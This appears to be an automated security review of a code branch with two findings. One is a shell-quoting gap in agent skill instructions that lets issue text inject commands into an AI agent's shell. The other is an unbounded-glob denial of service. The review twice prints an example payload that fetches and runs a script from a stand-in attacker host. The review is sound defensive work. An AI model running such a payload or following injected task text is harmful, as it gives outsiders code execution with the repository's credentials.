@@ -1,0 +1,125 @@
+STATUS: DONE_WITH_CONCERNS
+
+## Security Review (r03 delta, wave 5, second look at slice-07)
+
+### Scope
+- Branch: `feat/conditional-reads`, head `5382b56abf17d23db61108554f3c6c68c8e3c036`
+- Merge-base: `d6267d4a5099f39b74e86a71e5c8f61ca47aa63d`
+- Scope mode: explicit slice (slice-07: tests plus the small non-test hunks in `metaproject-adapter.ts`, `metaproject-operations.ts`, `metaproject-port.ts`, `group-subcommands.ts`, `mcp/metaproject-tools.ts`, `help-groups.ts`), read at head together with the code those tests exercise: `references-config.ts`, `references-section.ts`, `reference-proof.ts`, `reference-entries.ts`, `resolved-context-check.ts`, `references-check.ts`, `context-resolver.ts`, `src/lib/glob.ts`, `src/lib/card-safe.ts`, and the r02-to-r03 delta (commits 4838b1b40, 5382b56ab).
+- Changed files reviewed: 24 in the slice (the 6 non-test files plus 18 test files, which only add fixtures in temp dirs) and 12 neighbours read at head
+
+### Summary
+- Blockers: 0
+- Major: 1
+- Minor: 1
+- Info: 0 new (r02 findings that still apply are cited below, not re-filed)
+
+### Findings
+
+### [F-001] The r02 task-text quoting fix reached one of five instruction sites; four still tell the agent to wrap untrusted text in single quotes with no rule for an embedded `'`
+- **Severity**: major
+- **File**: src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md (managed copy `.metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md`, byte-identical)
+- **Attack vector**: A third party who controls the text of an issue or PR that is decomposed into a task (the `task.description` that issue-analyzer produces) writes `x'; curl https://evil.example/p.sh | sh; echo '`. The executing agent follows the instruction literally and substitutes it into `--task-text '<task.description>'`. The single quote closes the argument and the rest runs in the agent's Bash shell, with the repo checkout and its credentials. An ordinary apostrophe ("don't", "user's") breaks the command the same way, so the failure also happens without an attacker.
+- **Problem**: Commit 4838b1b40 moved the examples from double quotes (where a backtick or `$(...)` in the description would execute) to single quotes, and wrote the escaping rule only in flow-orchestrator: "Write the text single-quoted (a `'` inside it becomes `'\''`): double quotes let the shell run any backtick or `$(...)`". The other four instruction sites carry the single-quote form and no escape rule. A single-quoted example without the `'\''` rule is safe only for text with no apostrophe.
+- **Why it matters**: The text that reaches the shell is task text from issues and PR descriptions, which outsiders can write. The harness and MCP path (`task_text` field) and the CLI argv path do not shell out, so the exposure is limited to these skill instructions, but they are what the agent executes. Reaching code execution needs the model to copy the string verbatim, so this is a plausible but model-dependent path, not a deterministic one.
+- **Fix**: Either put the same sentence as flow-orchestrator:323 at every site, or remove the shell from the path. The second is better: have the agent write the text to a file inside the workspace and pass `--task-text-file <path>`, or read `--task-text` from stdin (`--task-text -`), so no quoting rule is needed. If the quoting rule stays, add a contract test over all bundled skill files that fails when a `--task-text '` example appears without the `'\''` rule, so a sixth site cannot be added silently.
+- **quote**: `--task-text '<task.description>' --out <project-relative path>`
+- **class_scope**:
+  - sites: `src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182`, `src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188`; the byte-identical managed copies under `.metaproject/skills/gdskills/` at the same lines. Correct (carries the escape rule): `src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323`.
+  - enumeration_method: `keryx ctx rg -n --all "task-text" src/gdskills/bundled/skills` returned 7 matches in 5 files; `keryx ctx rg -n --all -e "single-quoted" -e "inside it becomes" src/gdskills/bundled/skills` shows the escape rule only at flow-orchestrator:323 (the other "single-quoted" hits are the unrelated `set -- <path...>` lines).
+
+### [F-002] Declared globs go into a regex built from `**` and into a brace expander with no bound on either
+- **Severity**: minor
+- **File**: src/gdskills/reference-entries.ts:58 (calls `src/lib/glob.ts`, unchanged by this PR)
+- **Attack vector**: Someone who can change `.metaproject/rules/project/references.json` in a PR (a fork PR, for instance) adds `"globs": ["**/**/**/**/**/**/**/zzz"]` or twelve or more chained `{a,b}` groups. When a maintainer or CI runs `keryx skills resolve-context` or `keryx skills references check` on the checked-out branch, `globToRegExp` turns each `**` into `.*` (so seven of them backtrack polynomially against every task file path that does not match), and `expandBraces` produces 2^n globs, each compiled to a regex. The command stalls or runs out of memory.
+- **Problem**: `references-config.ts` validates that each glob is a non-empty string and nothing else. This PR is the first place a glob from a file that is meant to be edited per project is fed to `matchesAnyGlobWithBraces`; the same function already serves rule front-matter globs, which have the same shape of exposure.
+- **Why it matters**: Denial of service on a reviewer's machine or a CI job from a config file in the PR. No data is exposed and the attacker needs write access to a proposed change, hence minor, defence in depth.
+- **Fix**: In `parseWhen`, cap the number of globs per entry, the length of a glob, the number of `**` per glob and the number of `{`, and reject a glob over the cap with a message that names the entry. In `globToRegExp`, collapse consecutive `**` into one `.*`.
+- **quote**: `const glob = declaration.when.globs.find((candidate) => files.some((file) => matchesAnyGlobWithBraces(file, [candidate])));`
+
+### r02 findings that still apply unchanged (cited, not re-filed)
+- review-security-code-w1:F-003 and review-security-code-w3:F-003 (info): `currentSection` in `src/gdskills/reference-proof.ts` and `currentSha` in `src/gdskills/resolved-context-check.ts` read `entry.path` from the `--resolved` JSON with `path.isAbsolute(...) ? entry.path : path.join(...)` and no containment, so a hand-edited resolve file turns the validator into a hash and shared-word-count oracle for any readable file. Both are still present at head. The hash part (`currentSha`) predates this PR.
+- review-security-code-w3:F-002 (info): heading text of a declared document is copied into resolver warnings unchanged and printed by `console.error`. The TUI paths now go through `cardSafe`; the CLI output paths do not.
+- review-security-code-w4:F-003 (minor): `src/lib/args.ts` `optionValue` returns `undefined` for a `--task-text` value that begins with `--`, so such text is silently dropped. `lib/args.ts` is not in the delta.
+- review-security-code-w4:F-002 (major): superseded by F-001 above, which states the remaining state of that finding.
+
+### Verified closed by the r03 delta
+- Quadratic heading scan (w1:F-001, w3:F-001): `parseHeadingLine` and `stripClosingHashes` in `references-section.ts` are hand-written linear loops; `FENCE` is anchored and linear.
+- Raw task text in `last.json` (w1:F-002, w4:F-001): `recordLastResolve` stores only `taskTextLength` and `taskTextTruncated`.
+- Control bytes in the TUI (w5:F-001): `presentProjectContext` maps every line through `cardSafe` (ESC sequences, OSC, C0/C1, bidi controls) and the sidebar value is wrapped as well.
+- `keywordOccurs` builds its regex from `escapeRegExp(keyword)` under the `iu` flags: every escaped character is a syntax character, so there is no invalid-escape throw and no user-controlled quantifier.
+- `readDeclaredFile` does `lstat`, `realpath`, `isPathInside(rootReal, real)`, a regular-file check and a size cap before reading; `normaliseRelativePath` rejects absolute, drive-letter and `..` paths. The symlink-escape test at slice line 823 covers the resolver side.
+- The linked-rule scan added to `references-check.ts` reads an origin path only to extract backtick-quoted `.md` names, and every name then goes through `inspectDocument` with a realpath containment check, so it discloses no file content.
+- MCP and harness `task_text` (`mcp/metaproject-tools.ts`, `metaproject-operations.ts`, `metaproject-adapter.ts`): passed as a value, truncated by `truncateTaskText`, matched only through `keywordOccurs`. No shell, no SQL, no path use.
+
+### Clean Areas
+- Injection (SQL, command, template, eval): none in the changed code; no `exec`/`spawn`/`eval` in the slice or the neighbours read.
+- Auth/authz, IDOR, CSRF, open redirect, crypto: not touched by this slice.
+- Secrets: a scan of the flow-462 files, the requirements folder and `src/gdskills` for tokens, keys and `/home/...` paths found only the operator runbook and pre-existing test and rule files; no credential.
+- Test files in the slice write only under `mkdtemp` roots and `rm` only those roots.
+- Path traversal: covered above (declared path, cited path, symlink).
+
+REVIEW_RESULT:
+```json
+{
+  "status": "DONE_WITH_CONCERNS",
+  "reviewer": "review-security-code",
+  "summary": "Delta r03, wave 5, slice-07 second look. Two new findings: one major (the r02 task-text shell-quoting fix reached only flow-orchestrator; four other instruction sites still show single-quoted untrusted text with no rule for an embedded apostrophe, a command-injection path through issue text via the executing agent) and one minor (unbounded globs and brace groups from references.json feed a backtracking regex and an exponential expander). Earlier r02 findings on heading ReDoS, task text in last.json and terminal control bytes are closed at head; w1:F-003, w3:F-002, w3:F-003 and w4:F-003 still apply unchanged.",
+  "findings": [
+    {
+      "id": "F-001",
+      "severity": "major",
+      "reviewer": "review-security-code",
+      "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
+      "line": null,
+      "quote": "--task-text '<task.description>' --out <project-relative path>",
+      "problem": "Commit 4838b1b40 changed the --task-text examples from double to single quotes and wrote the rule that an embedded ' becomes '\\'' only in flow-orchestrator/SKILL.md:323. Four other instruction sites (task-implementer, tests-creator, job-orchestrator SKILL.md twice, orchestrator-prompt.md twice) show --task-text '<...>' with no escape rule, so text that holds an apostrophe closes the quote and the remainder is parsed by the shell.",
+      "impact": "Task text comes from issues and PR descriptions that outsiders can write. An issue body such as x'; curl https://evil.example/p.sh | sh; echo ' substituted literally by the executing agent runs in its Bash shell with the checkout and its credentials. Plain apostrophes break the command without any attacker. Exploitation needs the model to copy the text verbatim, hence major and not blocker.",
+      "suggested_fix": "Put the same sentence as flow-orchestrator:323 at every site, or better remove the shell from the path: write the text to a workspace file and pass --task-text-file, or read it from stdin. Add a contract test over bundled skill files that fails on a --task-text ' example without the escape rule.",
+      "evidence": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills lists 7 matches in 5 files; keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" shows the escape rule only at flow-orchestrator/SKILL.md:323. task-implementer/SKILL.md:182 reads: ... --task-text '<task.description>' --out <project-relative path> ...; no escape mention anywhere in that file. The managed copies under .metaproject/skills/gdskills are byte-identical (diff -q on task-implementer).",
+      "confidence": "high",
+      "dedupe_key": "task-text-single-quote-no-escape-rule",
+      "blocking_merge": false,
+      "location_class": "in-diff",
+      "class_scope": {
+        "sites": [
+          "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
+          "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
+          ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (correct: carries the escape rule)"
+        ],
+        "enumeration_method": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills (7 matches, 5 files) plus keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" src/gdskills/bundled/skills (escape rule at flow-orchestrator:323 only); .metaproject copies are byte-identical per the skill-sync test"
+      }
+    },
+    {
+      "id": "F-002",
+      "severity": "minor",
+      "reviewer": "review-security-code",
+      "file": "src/gdskills/reference-entries.ts",
+      "line": null,
+      "quote": "const glob = declaration.when.globs.find((candidate) => files.some((file) => matchesAnyGlobWithBraces(file, [candidate])));",
+      "problem": "Globs from references.json are validated only as non-empty strings, then passed to matchesAnyGlobWithBraces. globToRegExp turns every ** into .* (polynomial backtracking with several of them) and expandBraces expands {a,b} groups recursively into 2^n globs, each compiled to a regex.",
+      "impact": "A references.json in a proposed change with seven chained ** or a dozen {a,b} groups stalls or exhausts memory when a maintainer or CI runs resolve-context or references check on the branch. Denial of service only, needs write access to a change, so defence in depth.",
+      "suggested_fix": "In parseWhen cap globs per entry, glob length, count of ** and count of {; in globToRegExp collapse consecutive ** into one .*.",
+      "evidence": "src/lib/glob.ts: 'source += \".*\";' for each **, and expandBraces recurses over every alternative; references-config.ts parseWhen/stringList check only typeof string and non-empty.",
+      "confidence": "medium",
+      "dedupe_key": "references-glob-unbounded",
+      "blocking_merge": false,
+      "location_class": "in-diff"
+    }
+  ],
+  "stats": { "blocker": 0, "major": 1, "minor": 1, "info": 0 },
+  "slices": [{ "id": "slice-07", "coverage": "whole diff read; non-test hunks and the code the tests exercise read at head", "status": "DONE" }]
+}
+```
+
+Routing audit: graph_used: no (not-relevant: the slice is tests plus small hunks and the callers were read directly); wiki_used: no (not-relevant); ctx_used: yes (keryx ctx rg, ctx read); raw_rg_used: no. Raw git, sed, grep and shell reads were limited to diff-header listing, targeted line prints and counts, each with a stated reason.
